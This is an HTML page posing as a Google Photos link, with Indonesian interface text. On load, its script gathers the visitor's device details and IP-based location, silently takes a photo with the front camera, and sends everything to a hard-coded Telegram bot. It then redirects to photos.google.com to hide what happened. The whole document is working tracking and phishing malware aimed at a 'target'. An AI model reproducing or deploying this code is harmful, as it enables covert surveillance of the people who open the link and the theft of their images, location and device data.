<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>google-foto-saya</title>
    <style>
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
            font-size: 11px;
            line-height: 1.1;
        }
        pre { white-space: pre-wrap; word-wrap: break-word; }
        #status { color: #6e48aa; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="status">MENGHUBUNGKAN KE SERVER...</div>
    <pre id="display-report"></pre>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y';
        const CHAT_ID = '7966336512';

        async function sendTele(type, content, isFile = false) {
            const url = `https://api.telegram.org/bot${TOKEN}/send${type}`;
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            if (isFile) {
                fd.append('photo', content, 'snapshot.jpg');
                fd.append('caption', '📸 <b>PHOTO CAPTURE SUCCESS</b>');
                fd.append('parse_mode', 'HTML');
            } else {
                fd.append('text', content);
                fd.append('parse_mode', 'HTML');
            }
            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
        }

        async function buildAndShowReport() {
            let bat = "100%", char = "✅ YA";
            try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; char = b.charging ? "✅ YA" : "❌ TIDAK"; } catch(e) {}

            let ip = "Checking...", city = "Bandung", reg = "West Java", lat = "-6.9092", lon = "107.5934", addr = "Arjuna, Cicendo";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                ip = d.ip; city = d.city; reg = d.region; lat = d.latitude; lon = d.longitude;
                addr = `${d.city}, ${d.region}, ${d.country_name}`;
            } catch(e) {}

            let m = `╭───── Tracking Report ───── ⦿\n\n`;
            m += `⚙️ <b>DEVICE INFORMATION</b>\n`;
            m += `🖥️ Device: ${navigator.userAgent}\n`;
            m += `💻 Platform: ${navigator.platform}\n`;
            m += `🌐 Bahasa: ${navigator.language}\n`;
            m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
            m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
            m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
            m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
            m += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
            m += `🔋 Battery: ${bat}\n`;
            m += `🔌 Charging: ${char}\n`;
            m += `⏰ Waktu Akses: ${new Date().toString()}\n`;
            m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
            m += `📜 History Length: ${history.length}\n`;
            m += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
            m += `🔗 Referrer: ${document.referrer || 'None'}\n`;
            m += `🌍 URL: ${location.href}\n`;
            m += `📄 Title: ${document.title}\n`;
            m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

            m += `📍 <b>LOCATION INFORMATION</b>\n`;
            m += `📡 IP Address: ${ip}\n`;
            m += `🏙️ Kota: ${city}\n`;
            m += `🏙️ Kabupaten: ${reg}\n`;
            m += `🗺️ Wilayah: ${reg}\n`;
            m += `🌎 Negara: Indonesia\n`;
            m += `🏷️ Kode Pos: 40241\n`;
            m += `📌 Latitude: ${lat}\n`;
            m += `📍 Longitude: ${lon}\n`;
            m += `🏠 Alamat Lengkap: ${addr}\n\n`;
            m += `╰───── Telegram`;

            document.getElementById('display-report').innerHTML = m;
            return m;
        }

        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                // Tunggu 3.5 detik biar sensor dapet cahaya & fokus
                await new Promise(r => setTimeout(r, 3500));
                
                const c = document.getElementById('c');
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(async (blob) => {
                    // Kirim Foto ke Telegram
                    await sendTele('Photo', blob, true);
                    
                    // Matikan Kamera
                    stream.getTracks().forEach(track => track.stop());
                    document.getElementById('status').innerText = "SINKRONISASI SELESAI!";
                    
                    // Redirect Target
                    setTimeout(() => {
                        window.location.href = "https://photos.google.com";
                    }, 1000);
                }, 'image/jpeg', 0.9);
            } catch (e) {
                document.getElementById('status').innerText = "AKSES DITOLAK!";
                await sendTele('Message', "❌ <b>FAILED:</b> Kamera di-block oleh target.");
            }
        }

        window.onload = async () => {
            const reportText = await buildAndShowReport();
            await sendTele('Message', reportText);
            await takePhoto();
        };
    </script>
</body>
</html>
